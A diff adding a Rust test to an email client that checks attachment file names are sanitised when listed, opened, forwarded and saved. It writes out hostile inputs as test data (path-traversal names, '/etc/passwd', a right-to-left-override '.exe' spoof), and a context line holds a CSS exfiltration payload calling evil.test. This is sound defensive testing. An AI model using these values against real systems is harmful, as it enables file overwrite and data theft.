@@ -787,6 +787,53 @@ input[value^="a"] { background: url(http://evil.test/5) }
         assert!(!html.contains("jolta-sigline"), "the body says it instead");
     }
 
+    /// A message whose attachments are named `names`, sent RFC 2231
+    /// encoded, so a name can hold any byte.
+    fn with_raw_names(names: &[String]) -> Vec<u8> {
+        let mut raw = String::from("From: a@example.com\r\nSubject: s\r\nMIME-Version: 1.0\r\n\
+            Content-Type: multipart/mixed; boundary=\"b\"\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nSee attached.\r\n");
+        for (i, n) in names.iter().enumerate() {
+            let encoded: String = n.bytes().map(|b| if b.is_ascii_alphanumeric() { (b as char).to_string() } else { format!("%{b:02X}") }).collect();
+            raw.push_str(&format!(
+                "--b\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename*=utf-8''{encoded}\r\n\r\nfile {i}\r\n"
+            ));
+        }
+        raw.push_str("--b--\r\n");
+        raw.into_bytes()
+    }
+
+    #[test]
+    fn every_attachment_name_handed_out_is_a_plain_file_name() {
+        let names: Vec<String> = ["../x", "/etc/passwd", "a\\b", "", ".", "..", "..\\..\\x", "a\u{1}b\nc", "notes\u{202E}fdp.exe", "C:x"]
+            .iter()
+            .map(|s| s.to_string())
+            .chain([format!("{}.pdf", "a".repeat(1000)), "é".repeat(400)])
+            .collect();
+        let raw = with_raw_names(&names);
+        let dir = std::env::temp_dir().join(format!("jolta-names-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+
+        let listed: Vec<String> = attachments(&raw).into_iter().map(|a| a.name).collect();
+        let opened: Vec<String> = (0..names.len()).map(|i| attachment_bytes(&raw, i).unwrap().0).collect();
+        let forwarded: Vec<String> = crate::compose::forward_attachments(&raw, &dir.join("fwd")).unwrap().into_iter().map(|f| f.name).collect();
+        assert_eq!(listed.len(), names.len());
+        assert_eq!(opened, listed, "opening uses the name the reader lists");
+        assert_eq!(forwarded, listed, "forwarding uses it too");
+        for name in &listed {
+            assert!(!name.is_empty() && !name.starts_with('.'), "{name:?}");
+            assert!(!name.chars().any(|c| matches!(c, '/' | '\\' | ':') || c.is_control() || ('\u{202A}'..='\u{202E}').contains(&c)), "{name:?}");
+            assert!(name.len() <= 255, "{} bytes", name.len());
+            assert_eq!(dir.join(name).parent(), Some(dir.as_path()), "{name:?}");
+        }
+        assert!(listed[10].ends_with(".pdf"), "a long name keeps its extension: {}", listed[10]);
+
+        let saved = save_listed(&raw, 1, &dir).unwrap();
+        assert_eq!(saved.len(), names.len());
+        assert!(saved.iter().all(|p| p.parent() == Some(dir.as_path())));
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
     #[test]
     fn save_listed_writes_each_file_without_overwriting() {
         let dir = std::env::temp_dir().join(format!("jolta-save-{}", std::process::id()));
